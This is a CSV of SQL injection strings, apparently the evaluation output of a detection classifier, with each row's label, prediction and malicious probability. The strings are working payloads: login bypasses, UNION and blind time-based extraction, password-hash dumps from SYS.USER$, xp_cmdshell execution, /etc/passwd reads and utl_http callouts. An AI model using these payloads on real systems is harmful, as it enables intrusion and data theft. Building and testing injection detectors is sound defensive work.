Query,Label,predicted,correct,malicious_probability
" select * from users where id  =  1 or ""  )  .""  =  1 or 1  =  1 -- 1",1,1,True,0.9998353494002072
" select * from users where id  =  1 or 1#"". union select null,version  (    )   -- 1",1,1,True,0.9994998275979046
admin' or '1'  =  '1,1,1,True,0.9999999998007658
; if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --,1,1,True,0.9956126235091554
" select * from users where id  =  1 union select 1,banner from v$version where rownum  =  1 -- 1",1,1,True,0.9996669910107526
""" or 0  =  0 --",1,1,True,0.9994498772643549
" select * from users where id  =  1 union select @ $_,version  (    )   -- 1",1,1,True,0.9994697676784242
select * from users where id  =  1 <@.$ or 1  =  1 -- 1,1,1,True,0.9998749963538304
" select * from users where id  =  1 or ""%."" or 1  =  1 -- 1",1,1,True,0.9998433218282563
" select * from users where id  =  1 + $+*$ union select null,@@VERSION -- 1",1,1,True,0.9995967596501046
" select * from users where id  =  1 or "",."" or 1  =  1 -- 1",1,1,True,0.9998433218282563
char%4039%41%2b%40SELECT,1,1,True,0.9686415450839083
" select * from users where id  =  1 or ""1&"" or 1  =  1 -- 1",1,1,True,0.9998433218282563
admin'  )   or   (  '1'  =  '1,1,1,True,0.9999999998743603
declare @s varchar   (  200  )   select @s   =   0x73656c6 ...,1,1,True,0.9640168045799479
"or 0  =  0 #""",1,1,True,0.9971896597875647
" select * from users where id  =  1 or "".]"" or 1  =  1 -- 1",1,1,True,0.9998433218282563
  )   or   (  'x'  =  'x,1,1,True,0.9997442721473722
" select * from users where id  =  1.<@$ union select 1,version  (    )   -- 1",1,1,True,0.9992411417288657
$  (  sleep 50  ) ,1,1,True,0.9963359054178321
" select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1",1,1,True,0.9996193228451955
"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype   =   'u' --",1,1,True,0.9988655002932034
" select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1",1,1,True,0.9998689682932502
" select * from users where id  =  1 or 1#""; union select null,version  (    )   -- 1",1,1,True,0.9997494494690312
" select * from users where id  =  1 or 1#""? or 1  =  1 -- 1",1,1,True,0.9998681735457959
"""a"""" or 1  =  1--""",1,1,True,0.9999633822787658
" select * from users where id  =  1 *1 union select 1,banner from v$version where rownum  =  1 -- 1",1,1,True,0.999692305085998
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1,1,True,0.9839740393736525
" select * from users where id  =  '1' union select   (  \  )  ,@@VERSION -- 1'",1,1,True,0.9999629842300397
1 and user_name  (    )     =   'dbo',1,1,True,0.9315974270586356
"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",1,1,True,0.999803297238464
" select * from users where id  =  1 or 1#""$ union select 1,version  (    )   -- 1",1,1,True,0.9996115900929593
" select * from users where id  =  1 or 1#""{ union select null,version  (    )   -- 1",1,1,True,0.9994998275979046
select * from users where id  =  '1' *$ . or 1  =  1 -- 1',1,1,True,0.9999941427405346
select * from users where id  =  1 +$+. or 1  =  1 -- 1,1,1,True,0.9998779884410843
select * from users where id  =  1 or   (  \+  )    =  1 or 1  =  1 -- 1,1,1,True,0.9998260061751547
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",1,1,True,0.973461068358781
or 1  =  1 or ''  =  ',1,1,True,0.9991577660080625
select * from users where id  =  1   or 1  =  1 -- 1,1,1,True,0.9998853945189823
or 'text' > 't',1,1,True,0.9806853668535076
"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",1,1,True,0.9999999878703308
" select * from users where id  =  1 or ""%["" or 1  =  1 -- 1",1,1,True,0.9998433218282563
" select * from users where id  =  1 or 1#"";  =  1 union select 1,version  (    )   -- 1",1,1,True,0.9998161484924218
admin' or '1'  =  '1'#,1,1,True,0.9999999999797984
select * from users where id  =  1 +$ 1 or 1  =  1 -- 1,1,1,True,0.9998932329790895
s,1,1,True,0.949732111598164
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1,1,True,0.97270657267779
 select * from information_schema.tables--,1,1,True,0.9998269373034846
" select * from users where id  =  1 or ""$&"" or 1  =  1 -- 1",1,1,True,0.9998433218282563
1   )    )    or pg_sleep  (  __TIME__  )  --,1,1,True,0.9998883499525549
" select * from users where id  =  '1' union select !<@,version  (    )   -- 1'",1,1,True,0.9999419276608585
declare @q nvarchar   (  200  )   select @q   =   0x770061 ...,1,1,True,0.9759995146190945
 or 1  =  1 or ''  =  ',1,1,True,0.9987987228531613
select * from users where id  =  1 %!<1 or 1  =  1 -- 1,1,1,True,0.9999042758824647
declare @q nvarchar   (  200  )   select @q   =   0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec  (  @q  ) ,1,1,True,0.9652265340919508
" select * from users where id  =  1 or ""]1"" or 1  =  1 -- 1",1,1,True,0.9998433218282563
" select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1",1,1,True,0.9997508860411938
or 'unusual'   =   'unusual',1,1,True,0.9448151669463882
 or 1 in   (  select @@version  )  --,1,1,True,0.9999581126143081
truncate,1,0,False,0.4799834397556273
as,1,1,True,0.9699500390647859
 or 3  =  3 --,1,1,True,0.9988031003662008
" select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1",1,1,True,0.9997118572699728
" select * from users where id  =  1 <@$$ union select 1,version  (    )   -- 1",1,1,True,0.9994924703588305
"admin""  )   or   (  ""1""  =  ""1",1,1,True,0.999999863618996
" select * from users where id  =  1 or 1#""@ union select 'a',version  (    )   -- 1",1,1,True,0.9998689682932502
"1  )   or benchmark  (  10000000,MD5  (  1   )    )   #",1,1,True,0.9982367835329521
" select * from users where id  =  1 union select .1_,version  (    )   -- 1",1,1,True,0.99942407405439
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.DATABASE_NAME FROM DUAL   )    )    AND 'i'  =  'i,1,1,True,0.9982848533448003
" or 0  =  0 #""",1,1,True,0.996526435209755
select * from users where id  =  1 %$ 1 or 1  =  1 -- 1,1,1,True,0.999909613973158
select * from users where id  =  1 %!<@ or 1  =  1 -- 1,1,1,True,0.999896842866927
"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",1,1,True,0.9997493644415054
1  )   or sleep  (  __TIME__  )  #,1,1,True,0.9988548689979583
" select * from users where id  =  1 or ""1_"" or 1  =  1 -- 1",1,1,True,0.9998433218282563
" select * from users where id  =  1 <1## union select 1,version  (    )   -- 1",1,1,True,0.9997107002036861
" select * from users where id  =  1 + $+*\ union select null,@@VERSION -- 1",1,1,True,0.9995967596501046
select * from users where id  =  1. <@ or 1  =  1 -- 1,1,1,True,0.9998505645686585
 or true--,1,1,True,0.9935860560080523
; execute immediate 'sel' || 'ect us' || 'er',1,1,True,0.9952950702667035
hi' or 'x'  =  'x';,1,1,True,0.9999527163532772
select * from users where id  =  1 <@ or 1  =  1 -- 1,1,1,True,0.9998749963538304
" select * from users where id  =  1 or "".,"" or 1  =  1 -- 1",1,1,True,0.9998433218282563
admin' #,1,1,True,0.9999999999954017
" select * from users where id  =  1 <@$_ union select 1,version  (    )   -- 1",1,1,True,0.9994924703588305
" select * from users where id  =  1 or "",  (  "" or 1  =  1 -- 1",1,1,True,0.9998061188578231
" select * from users where id  =  1 or "",{"" or 1  =  1 -- 1",1,1,True,0.9998433218282563
" union select 1,load_file  (  '/etc/passwd'  )  ,1,1,1;",1,1,True,0.9973965206072691
"""  )  ;waitfor delay '0:0:__TIME__'--",1,1,True,0.9995861393604771
 or 'unusual'   =   'unusual',1,1,True,0.9440641842163718
"insert into mysql.user   (  user, host, password  )   values   (  'name', 'localhost', password  (  'pass123'   )    )   ",1,1,True,0.9866525099889091
"admin"" or ""1""  =  ""1""/*",1,1,True,0.9999999978096918
" select * from users where id  =  1 or ""1  (  ""  =  1 or 1  =  1 -- 1",1,1,True,0.9998294846810053
" select * from users where id  =  1 or \<1 union select 1,@@VERSION -- 1",1,1,True,0.9997508860411938
like,1,1,True,0.9356297137891022
or username like char  (  37  )  ;,1,1,True,0.988347815828696
 )    )    or pg_sleep  (  __TIME__  )  --,1,1,True,0.9998314789291934
select * from users where id  =  1 or $+<\ or 1  =  1 -- 1,1,1,True,0.9998566951433442
or 3  =  3,1,1,True,0.9265974537096806
" select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",1,1,True,0.9998283100887461
select * from users where id  =  1 or   (  $+  )    =  1 or 1  =  1 -- 1,1,1,True,0.9998260061751547
exec sp,1,1,True,0.9071014386921178
" select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1",1,1,True,0.9997036937128801
select * from users where id  =  1 or \<$ or 1  =  1 -- 1,1,1,True,0.9998566951433442
" select * from users where id  =  1.&&1 union select 1,version  (    )   -- 1",1,1,True,0.9994177672160008
admin' or 1  =  1/*,1,1,True,0.9999999989195874
a' waitfor delay '0:0:10'--,1,1,True,0.9995322610671942
" select * from users where id  =  1 +  (  \  )   union select null,@@VERSION -- 1",1,1,True,0.9995756781835293
" select * from users where id  =  1 union select .1$_,version  (    )   -- 1",1,1,True,0.99942407405439
and 1 in   (  select var from temp  )  --,1,1,True,0.9980963259680716
hi'  )   or   (  'a'  =  'a,1,1,True,0.9997456195479403
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",1,1,True,0.9865773640705369
"admin"" or 1  =  1",1,1,True,0.9999999701324094
"""  )   or true--",1,1,True,0.9934263410350083
" select * from users where id  =  '1' or $ .  =  1 union select 1,@@VERSION -- 1'",1,1,True,0.9999755776535744
" select * from users where id  =  1 or ""  (  {"" or 1  =  1 -- 1",1,1,True,0.9998283100887461
1  )   or pg_sleep  (  __TIME__  )  --,1,1,True,0.999904500207048
" select * from users where id  =  1 or ""{."" or 1  =  1 -- 1",1,1,True,0.9998433218282563
"""  )   or sleep  (  __TIME__  )    =  """,1,1,True,0.9898001455550807
select * from users where id  =  1.<@. or 1  =  1 -- 1,1,1,True,0.9998631574810531
"admin""  )   or   (  ""1""  =  ""1""--",1,1,True,0.9999999767827116
" select * from users where id  =  1<@.. union select 1,version  (    )   -- 1",1,1,True,0.9992728692519186
; exec xp_regread,1,1,True,0.9936697844530269
" select * from users where id  =  '1' + @ 1 union select 1,version  (    )   -- 1'",1,1,True,0.9999636864040546
select * from users where id  =  1 + \+%1 or 1  =  1 -- 1,1,1,True,0.9998720089827353
" select * from users where id  =  1 or "";1"" or 1  =  1 -- 1",1,1,True,0.9998433218282563
" select * from users where id  =  1 or ""%&"" or 1  =  1 -- 1",1,1,True,0.9998433218282563
1 and 1  =  1,1,1,True,0.9939546132352616
or 0  =  0 #,1,1,True,0.9971896597875647
union select * from users where login   =   char ...,1,1,True,0.976903443287688
" select * from users where id  =  1 union select 1||@,version  (    )   -- 1",1,1,True,0.9994927970271696
admin'  )   or '1'  =  '1'--,1,1,True,0.9999999999944438
1;SELECT *,1,0,False,0.2943034788983246
" select * from users where id  =  1 or ""{;"" or 1  =  1 -- 1",1,1,True,0.9998433218282563
x' and 1  =    (  select count  (  *  )   from tabname  )  ; --,1,1,True,0.9997737380556041
" select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",1,1,True,0.9999456037098671
" select * from users where id  =  1 or ""?,"" or 1  =  1 -- 1",1,1,True,0.9998433218282563
" select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'",1,1,True,0.9999620357507913
"1 or benchmark  (  10000000,MD5  (  1   )    )   #",1,1,True,0.9983211812759114
procedure,1,1,True,0.6260285512800708
or ''  =  ',1,1,True,0.9979020393741438
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.LOGIN_USER FROM DUAL   )    )    AND 'i'  =  'i,1,1,True,0.9928437559522989
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1,1,True,0.9729571030899847
\'; desc users; --,1,1,True,0.9999317095661883
" select * from users where id  =  1 or   (  \.  )    =  1 union select 1,@@VERSION -- 1",1,1,True,0.9997105153708549
select * from users where id  =  '1' or $ 1  =  1 or 1  =  1 -- 1',1,1,True,0.9999921253202071
""" or """"^""",1,1,True,0.9399227505549619
"""-""",1,1,True,0.949732111598164
" select * from users where id  =  1 or \<   =  1 union select 1,@@VERSION -- 1",1,1,True,0.9997057569221499
" select * from users where id  =  1 union select 1<@$,version  (    )   -- 1",1,1,True,0.9994523232026629
" select * from users where id  =  1 *\ union select null,@@VERSION -- 1",1,1,True,0.9996436951405957
" select * from users where id  =  '1' or !<@ union select 1,version  (    )   -- 1'",1,1,True,0.9999465426193593
" select * from users where id  =  1 or "".%"" or 1  =  1 -- 1",1,1,True,0.9998433218282563
admin'/*,1,1,True,0.9999999999921159
" select * from users where id  =  1 or ""  (  #"" or 1  =  1 -- 1",1,1,True,0.9999122437853406
||UTL_HTTP.REQUEST,1,1,True,0.9781230968312017
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",1,1,True,0.9615145697921397
" select * from users where id  =  '1'<@.. union select 1,version  (    )   -- 1'",1,1,True,0.9999132352397612
"""   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",1,1,True,0.9976632388509526
" select * from users where id  =  1 <@.$ union select 1,version  (    )   -- 1",1,1,True,0.9994924703588305
" select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",1,1,True,0.999725548140817
select * from users where id  =  '1' <@.$ or 1  =  1 -- 1',1,1,True,0.9999936358408322
1 uni/**/on select all from where,1,1,True,0.9999405505650427
" select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",1,1,True,0.9996294093922
" select * from users where id  =  1 or 1#""? union select null,version  (    )   -- 1",1,1,True,0.9994998275979046
admin'  )   or '1'  =  '1'#,1,1,True,0.999999999989329
||utl_http.request  (  'httP://192.168.1.1/'  )  ||',1,1,True,0.9884632137584867
or '7659'  =  '7659,1,1,True,0.9598357966562867
" select * from users where id  =  1 or ""{@"" or 1  =  1 -- 1",1,1,True,0.9998433218282563
" select * from users where id  =  1 union select +!<1,version  (    )   -- 1",1,1,True,0.9994515019742948
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",1,1,True,0.8846189970540006
" select * from users where id  =  1 or ""  (  @"" or 1  =  1 -- 1",1,1,True,0.9998406126965866
or true--,1,1,True,0.9953417739288992
" select * from users where id  =  1 union select !<1,version  (    )   -- 1",1,1,True,0.9994888200479025
" select * from users where id  =  '1' union select \#,@@VERSION -- 1'",1,1,True,0.9999678298741589
" select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1",1,1,True,0.9996115900929593
""" or true--",1,1,True,0.9935860560080523
select * from users where id  =  1. or 1  =  1 -- 1,1,1,True,0.9998631574810531
" select * from users where id  =  1 or @#"",  =  1 union select 1,version  (    )   -- 1",1,1,True,0.9995108899798726
" select * from users where id  =  1 or "";@"" or 1  =  1 -- 1",1,1,True,0.9998433218282563
â or 3  =  3 --,1,1,True,0.9988031003662008
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT global_name FROM global_name   )    )    AND 'i'  =  'i,1,1,True,0.9567259094291286
" select * from users where id  =  1 +1 union select null,banner from v$version where rownum  =  1 -- 1",1,1,True,0.9996018582912404
" select * from users where id  =  1 or "",,""  =  1 or 1  =  1 -- 1",1,1,True,0.999834908886871
" select * from users where id  =  1 + $+%1 union select null,@@VERSION -- 1",1,1,True,0.9996615084057969
" select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",1,1,True,0.9996072566892547
" select * from users where id  =  1 or ""  )  1"" or 1  =  1 -- 1",1,1,True,0.9998486375684574
 or uid like '%,1,1,True,0.9371285452763833
select * from users where id  =  '1' <@&1 or 1  =  1 -- 1',1,1,True,0.9999942338100847
" select * from users where id  =  '1' union select !<1,version  (    )   -- 1'",1,1,True,0.9999460881843779
23 or 1  =  1; --,1,1,True,0.9999853762810427
" select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",1,1,True,0.9997036937128801
" select * from users where id  =  1 or ""{  (  ""  =  1 or 1  =  1 -- 1",1,1,True,0.999819821625794
" select * from users where id  =  1 or ""%_"" or 1  =  1 -- 1",1,1,True,0.9998433218282563
select * from users where id  =  1 +   (  \.  )   or 1  =  1 -- 1,1,1,True,0.9998482983801803
" select * from users where id  =  '1' union select \,@@VERSION -- 1'",1,1,True,0.9999678298741589
0 or 1  =  1,1,1,True,0.9961976619315454
select * from users where id  =  1 &@ or 1  =  1 -- 1,1,1,True,0.9998853945189823
"admin""  )   or ""1""  =  ""1",1,1,True,0.9999999551094101
select * from users where id  =  1 or \<   =  1 or 1  =  1 -- 1,1,1,True,0.9998350592133325
" select * from users where id  =  1 or ""??"" or 1  =  1 -- 1",1,1,True,0.9998433218282563
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1,1,True,0.9740723050607746
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1,1,True,0.9842578179764386
&apos; OR,1,1,True,0.9879569626986673
sqlvuln;,1,1,True,0.896868313126527
select * from users where id  =  1 + $+%$ or 1  =  1 -- 1,1,1,True,0.9998620565517307
select * from users where id  =  '1' + $+%\ or 1  =  1 -- 1',1,1,True,0.9999926561013394
""" or """"*""",1,1,True,0.9399227505549619
"hi or 1  =  1 --""",1,1,True,0.9999788860889848
" select * from users where id  =  1. union select null,banner from v$version where rownum  =  1 -- 1",1,1,True,0.9994739243300774
; exec master..xp_cmdshell 'ping 172.10.1.255'--,1,1,True,0.9991290398778762
" select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",1,1,True,0.9999587205588999
" select * from users where id  =  '1' union select ""?""_,version  (    )   -- 1'",1,1,True,0.9999409301114119
select * from information_schema.tables--,1,1,True,0.9998389577817042
select * from users where id  =  1 or \<\. or 1  =  1 -- 1,1,1,True,0.9998566951433442
   (  select top 1,1,1,True,0.9401791271826964
Ã½ or 1  =  1 --,1,1,True,0.999984095154538
a' --,1,1,True,0.9999999662180661
 or 1  =  1 /*,1,1,True,0.9998851427671896
" select * from users where id  =  1 or 1#"", union select null,version  (    )   -- 1",1,1,True,0.9994363268318246
" select * from users where id  =  '1' union select $ .,@@VERSION -- 1'",1,1,True,0.9999678298741589
--,1,1,True,0.9999999997179412
"exec sp_addlogin 'name' , 'password'",1,1,True,0.9973256723512394
" select * from users where id  =  1   union select null,banner from v$version where rownum  =  1 -- 1",1,1,True,0.9995876943709466
0x77616974666F722064656C61792027303A303A31302700 exec  (  @s  ) ,1,1,True,0.9435664678010193
" select * from users where id  =  1 or "".  )  "" or 1  =  1 -- 1",1,1,True,0.9998434601960802
" select * from users where id  =  1 or @<@  =  1 union select 1,version  (    )   -- 1",1,1,True,0.9995579630852882
group by userid having 1  =  1--,1,1,True,0.9989395229988047
" select * from users where id  =  1 + \+%1 union select null,@@VERSION -- 1",1,1,True,0.9996615084057969
select * from users where id  =  1 *1 or 1  =  1 -- 1,1,1,True,0.9998929648323457
" select * from users where id  =  1 or @#"";  =  1 or 1  =  1 -- 1",1,1,True,0.9999305028535664
‘ or 1  =  1 --,1,1,True,0.999984095154538
" select * from users where id  =  1 *\. union select null,@@VERSION -- 1",1,1,True,0.9996436951405957
select * from users where id  =  1 %  (  @  )   or 1  =  1 -- 1,1,1,True,0.9998935883551845
or 'a'  =  'a,1,1,True,0.9998318049381119
declare @s varchar  (  22  )   select @s   = ,1,1,True,0.9100497815996169
" select * from users where id  =  1 union select 1<@,version  (    )   -- 1",1,1,True,0.9994523232026629
" select * from users where id  =  1 + \+*\ union select null,@@VERSION -- 1",1,1,True,0.9995967596501046
" select * from users where id  =  1 or 1#"". union select version  (    )  ,version  (    )   -- 1",1,1,True,0.9996072566892547
@variable,1,1,True,0.9823966923801353
; exec master..xp_cmdshell,1,1,True,0.99554827230902
select * from users where id  =  1 +  (  1  )   or 1  =  1 -- 1,1,1,True,0.9998670489557818
" select * from users where id  =  1 union select @ 1$,version  (    )   -- 1",1,1,True,0.999498862989419
" select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",1,1,True,0.999498862989419
